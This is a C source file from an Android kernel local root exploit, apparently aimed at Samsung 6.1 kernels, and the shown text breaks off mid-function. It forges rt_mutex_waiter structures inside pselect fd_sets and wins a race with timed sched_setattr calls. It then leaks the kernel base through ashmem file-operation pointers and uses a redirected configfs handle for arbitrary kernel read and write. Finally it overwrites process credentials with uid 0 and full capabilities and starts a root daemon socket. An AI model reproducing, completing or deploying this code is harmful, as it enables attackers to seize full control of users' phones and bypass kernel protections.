#include "common.h"
#include <time.h>
#include <sys/mount.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;
extern uintptr_t ghostlock_precomputed_task;
extern uintptr_t ghostlock_precomputed_cred;

#define CFI_ROOT_SOCKET "/data/local/tmp/temp_su.sock"

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
atomic_int cfi_root_daemon_ready;
atomic_int cfi_stage_started;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  const char *forced = getenv("ROUTE_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000)
      return (int)value;
  }
  if (active_offsets && active_offsets->sync_route) {
    /* Rotate FOPS_DELAY_USEC by one step per route attempt. */
    static const int fops_delays[] = {70000, 60000, 80000,
                                      40000, 90000, 50000};
    static int sync_delay_counter;
    return fops_delays[sync_delay_counter++ % 6];
  }
  /* Let select() establish its stack frame before the PI walk. */
  if (pselect_custom_write == 2) {
    return PSELECT_ENTER_DELAY_USEC;
  }
  if (pselect_custom_write_enabled()) {
    static const int delays[] = {
      50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
    };
    int count = (int)(sizeof(delays) / sizeof(delays[0]));
    return delays[(attempt - 1) % count];
  }
  return -1;
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

/* EDEADLK-synchronized pselect phase (Samsung 6.1): runs on the waiter
 * thread after the handshake.  pselect6 uses a 100ms timeout; the consumer
 * fires one precisely timed sched_setattr at enter_ts + delay. */
void sync_pselect_phase(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("sync route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int pipefd[2];
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("sync route timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
  if (high_read < 0) {
    cfi_last_step = 31;
    cfi_last_errno = errno;
    pr_error("sync route F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_pselect_fdsets(&in, &out, &ex);
  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
  pr_info("sync pselect fds ready high_read=%d block_fd=%d pipe_r=%d pipe_w=%d nfds=%d\n",
          high_read, block_fd, pipefd[0], pipefd[1], PSELECT_ROUTE_NFDS);

  int stage_in_consumer = getenv("CFI_STAGE_IN_CONSUMER") != NULL;
  struct timespec timeout = { .tv_sec = 8, .tv_nsec = 0 };
  atomic_store(&gk_pselect_entered, 1);
  atomic_store(&gk_enter_ts, mono_ns());
  errno = 0;
  int ret = (int)syscall(SYS_pselect6, PSELECT_ROUTE_NFDS, &in, &out, &ex,
                         &timeout, NULL);
  int saved_errno = errno;
  if (stage_in_consumer) {
    uint64_t fire_spins = 0;
    while (!atomic_load(&gk_fire_success) &&
           !atomic_load(&gk_route_done) &&
           fire_spins < 200000000ULL) {
      __asm__ volatile("yield" ::: "memory");
      fire_spins++;
    }
    if (atomic_load(&gk_fire_success) > 0) {
      atomic_store(&gk_pselect_entered, 0);
      uint64_t root_ready_deadline = mono_ns() + 10000000000ULL;
      for (;;) {
        if (atomic_load(&cfi_root_daemon_ready)) {
          atomic_store(&gk_window_hit, 1);
          break;
        }
        if (mono_ns() >= root_ready_deadline) {
          break;
        }
        __asm__ volatile("yield" ::: "memory");
      }
    }
  }
  pr_info("sync pselect syscall returned ret=%d errno=%d\n", ret, saved_errno);
  pr_info("sync pselect post begin ret=%d route=%d fire=%d\n",
          ret, atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
  atomic_store(&gk_pselect_entered, 0);
  pr_info("sync pselect post cleared entered route=%d fire=%d\n",
          atomic_load(&gk_route_done), atomic_load(&gk_fire_success));

  /* The consumer sets route_done only after its in-thread CFI/self-patch
   * handoff. Keep the waiter frame alive until that handoff reports. */
  pr_info("sync pselect settle begin route=%d fire=%d\n",
          atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
  uint64_t settle_ns = stage_in_consumer ? 8000000000ULL : 200000000ULL;
  uint64_t deadline = mono_ns() + settle_ns;
  while (!atomic_load(&gk_route_done) && mono_ns() < deadline) {
    usleep(1000);
  }
  pr_info("sync pselect settle done route=%d fire=%d\n",
          atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
  int window_hit = (ret > 0 || atomic_load(&cfi_stage_done)) &&
                   atomic_load(&gk_fire_success) > 0;
  atomic_store(&gk_window_hit, window_hit);
  pr_info("sync route ret=%d errno=%d fire=%d hit=%d\n",
          ret, saved_errno, atomic_load(&gk_fire_success), window_hit);

  if (atomic_load(&cfi_root_daemon_ready)) {
    pr_success("sync root daemon ready; parking waiter thread in owned stack\n");
    for (;;) sleep(60);
  }

  if (window_hit && !pselect_custom_write_enabled() && !stage_in_consumer) {
    if (try_cfi_stage()) {
      cfi_last_step = 0;
    } else if (!cfi_last_step) {
      cfi_last_step = 32;
    }
  }

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}



uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_waiter_shift(void) {
  return active_offsets ? active_offsets->pselect_waiter_shift
                        : PSELECT_WAITER_WORD_SHIFT;
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_waiter_shift() + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };
  uint64_t waiter_task = fake_task;
  if (WAITER_COMPACT) {
    /* 6.1 compact rt_mutex_waiter (0x58): tree_entry 0x00, pi_tree_entry
     * 0x18, task 0x30, lock 0x38, wake_state+prio 0x40, deadline 0x48,
     * ww_ctx 0x50.  Word index = byte offset / 8 + 2. */
    struct pselect_waiter_word words[] = {
      {2, fake_parent, "tree_pc"},
      {3, 0, "tree_right"},
      {4, fake_right, "tree_left"},
      {5, fake_parent, "pi_parent"},
      {6, 0, "pi_right"},
      {7, fake_right, "pi_left"},
      {8, waiter_task, "task"},
      {9, fake_lock, "lock"},
      {10, 3ULL | (1ULL << 32), "wake_state+prio"},
      {11, 0, "deadline"},
      {12, 0, "ww_ctx"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
    return;
  }
  struct pselect_waiter_word words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, waiter_task,
     "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d simple=%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            route_attempt,
            0, pselect_waiter_shift(),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&gk_enter_ts, 0);
    atomic_store(&punch_consume_go, route_attempt);

    struct timeval timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_usec = PSELECT_TIMEOUT_USEC,
#else
      .tv_usec = 0,
#endif
    };

    pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
    errno = 0;
    atomic_store(&gk_enter_ts, mono_ns());
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    int saved_errno = errno;
    pr_info("pselect post-select +%.0fms ret=%d\n", fops_elapsed_ms(&route_t0), ret);
    atomic_store(&punch_consume_go, 0);

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_quality_miss) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (!is_direct_ptr(target) || !is_kernel_ptr(slots[i].value)) {
      pr_error("cfi fops refresh invalid slot=%zu off=%zx target=%016zx "
               "value=%016llx\n",
               i, slots[i].off, target,
               (unsigned long long)slots[i].value);
      return 0;
    }
    pr_info("cfi fops refresh begin slot=%zu off=%zx target=%016zx "
            "value=%016llx len=%zu\n",
            i, slots[i].off, target, (unsigned long long)slots[i].value,
            sizeof(slots[i].value));

    /* The sprayed table already contains the slide-adjusted open pointer.
     * This fd is open before misc_fops is redirected to fake_fops, and the
     * UMH path never opens it again.  Rewriting this field is unnecessary and
     * is the only refresh write that has rebooted the phone (shell21). */
    if (slots[i].off == FOPS_OPEN_OFF) {
      uint64_t existing = 0;
      errno = 0;
      ssize_t rd = kernel_read_data(fd, target, &existing, sizeof(existing));
      int read_errno = errno;
      pr_info("cfi fops open preflight target=%016zx ret=%zd value=%016llx "
              "want=%016llx errno=%d\n",
              target, rd, (unsigned long long)existing,
              (unsigned long long)slots[i].value, read_errno);
      if (rd == (ssize_t)sizeof(existing) && existing == slots[i].value) {
        pr_info("cfi fops refresh skip slot=%zu off=%zx reason=open-preloaded\n",
                i, slots[i].off);
        continue;
      }
      pr_warning("cfi fops open preflight mismatch; attempting refresh write\n");
    }

    errno = 0;
    ssize_t wr = kernel_write_data(
        fd, target, &slots[i].value, sizeof(slots[i].value));
    int write_errno = errno;
    pr_info("cfi fops refresh end slot=%zu off=%zx target=%016zx ret=%zd "
            "errno=%d\n",
            i, slots[i].off, target, wr, write_errno);
    if (wr != (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  pr_info("cfi leak start fops_alias=%016zx open_off=%zx ioctl_off=%zx "
          "mmap_off=%zx release_off=%zx show_fdinfo_off=%zx\n",
          kaslr_fops_alias, (size_t)FOPS_OPEN_OFF, (size_t)FOPS_IOCTL_OFF,
          (size_t)FOPS_MMAP_OFF, (size_t)FOPS_RELEASE_OFF,
          (size_t)FOPS_SHOW_FDINFO_OFF);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  pr_info("cfi leak read open=%016llx\n",
          (unsigned long long)kaslr_open_ptr);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  pr_info("cfi leak read ioctl=%016llx\n",
          (unsigned long long)kaslr_ioctl_ptr);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  pr_info("cfi leak read mmap=%016llx\n",
          (unsigned long long)kaslr_mmap_ptr);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  pr_info("cfi leak read release=%016llx\n",
          (unsigned long long)kaslr_release_ptr);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);
  pr_info("cfi leak read show_fdinfo=%016llx\n",
          (unsigned long long)kaslr_show_fdinfo_ptr);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);
  pr_info("cfi leak base=%016llx expected ioctl=%016llx mmap=%016llx "
          "release=%016llx show_fdinfo=%016llx\n",
          (unsigned long long)kaslr_base,
          (unsigned long long)kaslr_expected_ioctl,
          (unsigned long long)kaslr_expected_mmap,
          (unsigned long long)kaslr_expected_release,
          (unsigned long long)kaslr_expected_show_fdinfo);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  pr_info("cfi leak pointers verified; refreshing fake fops\n");
  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  pr_info("cfi fake fops refresh complete\n");
  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  if (active_offsets && active_offsets->umh_root) {
    /* The CFI fd already provides arbitrary kernel R/W. The pipe physical
     * primitive returned zero for system_unbound_wq after being layered on
     * the redirected fd, so keep the verified CFI handle live for UMH. */
    return install_android_root(fd);
  }
  return install_pipe_physrw(fd) && install_android_root(fd);
}

static int cfi_read64(int fd, uintptr_t addr, uint64_t *out) {
  *out = 0;
  return is_kernel_ptr(addr) &&
         configfs_read_once(fd, addr, out, sizeof(*out)) ==
             (ssize_t)sizeof(*out);
}

static uintptr_t cfi_find_task_by_tgid(int fd, uint32_t want_tgid) {
  uintptr_t head = text_addr(INIT_TASK_TASKS);
  uintptr_t head_alias = data_addr(INIT_TASK_TASKS);
  uint64_t entry = 0;
  pr_info("cfi task walk head=%016zx alias=%016zx want=%u\n",
          head, head_alias, want_tgid);
  if (!cfi_read64(fd, head, &entry)) {
    pr_error("cfi task walk: init_task.tasks read failed head=%016zx\n", head);
    return 0;
  }
  pr_info("cfi task walk first entry=%016llx\n",
          (unsigned long long)entry);

  uintptr_t tgid_fallback = 0;
  for (int i = 0; i < 4096; i++) {
    if (entry == head || entry == head_alias) break;
    if (!is_direct_ptr((uintptr_t)entry)) break;
    uintptr_t task = (uintptr_t)entry - TASK_TASKS_OFF;
    uint64_t pid_tgid = 0;
    if (!cfi_read64(fd, task + TASK_PID_OFF, &pid_tgid)) break;
    uint32_t pid = (uint32_t)pid_tgid;
    uint32_t tgid = (uint32_t)(pid_tgid >> 32);
    if (i < 8) {
      pr_info("cfi task walk i=%d task=%016zx pid=%u tgid=%u\n",
              i, task, pid, tgid);
    }
    if (pid == want_tgid) {
      pr_info("cfi task walk found want=%u task=%016zx pid=%u tgid=%u "
              "iter=%d\n", want_tgid, task, pid, tgid, i);
      return task;
    }
    if (!tgid_fallback && tgid == want_tgid) {
      tgid_fallback = task;
    }
    if (!cfi_read64(fd, task + TASK_TASKS_OFF, &entry)) break;
  }
  if (tgid_fallback) {
    pr_info("cfi task walk using tgid fallback want=%u task=%016zx\n",
            want_tgid, tgid_fallback);
    return tgid_fallback;
  }
  pr_error("cfi task walk failed want=%u head=%016zx last=%016llx\n",
           want_tgid, head, (unsigned long long)entry);
  return 0;
}

static int cfi_patch_cred_object(int fd, uintptr_t cred, const char *tag) {
  if (!is_direct_ptr(cred) || (cred & 3)) {
    pr_error("cfi cred %s invalid cred=%016zx\n", tag, cred);
    return 0;
  }

  int blind = getenv("CFI_BLIND_CRED") != NULL;
  uint32_t ids[8] = {0};
  if (!blind) {
    ssize_t ids_read =
        configfs_read_once(fd, cred + CRED_UID_OFF, ids, sizeof(ids));
    int ids_match = ids_read == (ssize_t)sizeof(ids);
    for (size_t i = 0; i < sizeof(ids) / sizeof(ids[0]); i++) {
      if (ids[i] != 2000) ids_match = 0;
    }
    pr_info("cfi cred %s=%016zx preflight ret=%zd ids="
            "%u,%u,%u,%u,%u,%u,%u,%u match=%d\n",
            tag, cred, ids_read, ids[0], ids[1], ids[2], ids[3],
            ids[4], ids[5], ids[6], ids[7], ids_match);
    if (!ids_match) return 0;
  } else {
    pr_info("cfi cred %s=%016zx blind trusted candidate\n", tag, cred);
  }

  uint32_t zero_ids[8] = {0};
  uint32_t securebits = 0;
  uint64_t caps[CRED_CAP_WORDS];
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) caps[i] = ~0ULL;

  if (blind) {
    unsigned char header[40];
    memset(header, 0, sizeof(header));
    put32(header, 0, 0x100);
    ssize_t header_write =
        configfs_write_once(fd, cred, header, sizeof(header));
    ssize_t caps_write =
        configfs_write_once(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps));
    pr_info("cfi cred %s blind aligned header=%zd caps=%zd\n",
            tag, header_write, caps_write);
    return header_write == (ssize_t)sizeof(header) &&
           caps_write == (ssize_t)sizeof(caps);
  }

  ssize_t ids_write =
      configfs_write_once(fd, cred + CRED_UID_OFF, zero_ids,
                          sizeof(zero_ids));
  ssize_t secure_write =
      configfs_write_once(fd, cred + CRED_SECUREBITS_OFF, &securebits,
                          sizeof(securebits));
  ssize_t caps_write =
      configfs_write_once(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps));

  uint32_t ids_after[8] = {0};
  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  ssize_t ids_rb =
      configfs_read_once(fd, cred + CRED_UID_OFF, ids_after,
                         sizeof(ids_after));
  ssize_t caps_rb =
      configfs_read_once(fd, cred + CRED_CAPS_OFF, caps_after,
                         sizeof(caps_after));
  int readback_ok =
      ids_rb == (ssize_t)sizeof(ids_after) &&
      caps_rb == (ssize_t)sizeof(caps_after);
  for (size_t i = 0; i < sizeof(ids_after) / sizeof(ids_after[0]); i++) {
    if (ids_after[i] != 0) readback_ok = 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != ~0ULL) readback_ok = 0;
  }
  pr_info("cfi cred %s writes ids=%zd secure=%zd caps=%zd readback=%zd/%zd "
          "ok=%d after=%u,%u,%u,%u,%u,%u,%u,%u\n",
          tag, ids_write, secure_write, caps_write, ids_rb, caps_rb,
          readback_ok, ids_after[0], ids_after[1], ids_after[2],
          ids_after[3], ids_after[4], ids_after[5], ids_after[6],
          ids_after[7]);
  return ids_write == (ssize_t)sizeof(zero_ids) &&
         secure_write == (ssize_t)sizeof(securebits) &&
         caps_write == (ssize_t)sizeof(caps) && readback_ok;
}

static int cfi_write64(int fd, uintptr_t addr, uint64_t value) {
  return is_kernel_ptr(addr) &&
         configfs_write_once(fd, addr, &value, sizeof(value)) ==
             (ssize_t)sizeof(value);
}

static int cfi_swap_task_cred_to_init(int fd, uintptr_t task) {
  uintptr_t init_cred = text_addr(INIT_CRED);
  unsigned char image[0x80];
  if (configfs_read_once(fd, init_cred, image, sizeof(image)) !=
      (ssize_t)sizeof(image)) {
    return 0;
  }
  uint64_t usage_before = 0;
  uint32_t ids[8] = {0};
  uint32_t securebits = 0;
  uint64_t caps[CRED_CAP_WORDS] = {0};
  uint64_t init_security = 0;
  memcpy(&usage_before, image, sizeof(usage_before));
  memcpy(ids, image + CRED_UID_OFF, sizeof(ids));
  memcpy(&securebits, image + CRED_SECUREBITS_OFF, sizeof(securebits));
  memcpy(caps, image + CRED_CAPS_OFF, sizeof(caps));
  memcpy(&init_security, image + CRED_SECURITY_OFF,
         sizeof(init_security));
  int ids_zero = 1;
  for (size_t i = 0; i < sizeof(ids) / sizeof(ids[0]); i++) {
    if (ids[i] != 0) ids_zero = 0;
  }
  if (!ids_zero || securebits != 0 ||
      caps[1] != CAP_FULL || caps[2] != CAP_FULL) {
    pr_error("cfi init_cred preflight failed ids_zero=%d secure=%u "
             "permitted=%016llx effective=%016llx\n",
             ids_zero, securebits,
             (unsigned long long)caps[1],
             (unsigned long long)caps[2]);
    return 0;
  }
  if (!is_kernel_ptr((uintptr_t)init_security)) {
    pr_error("cfi init_cred invalid security=%016llx\n",
             (unsigned long long)init_security);
    return 0;
  }

